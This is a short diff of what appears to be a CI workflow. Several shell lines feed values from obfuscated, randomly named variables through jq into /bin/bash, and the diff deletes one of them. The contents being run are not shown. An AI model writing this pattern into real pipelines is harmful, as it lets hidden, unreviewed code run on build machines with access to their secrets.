@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$twun4784" | jq -r .j9 | /bin/bash
           printf '%s' "$tqcx1939" | jq -r .axxvl65 | /bin/bash
-          echo $gar281 | jq -r .jy9 | /bin/bash
           printf '%s' "$qdcjr5" | jq -r .raqt66080 | /bin/bash
 
       - name: Store output
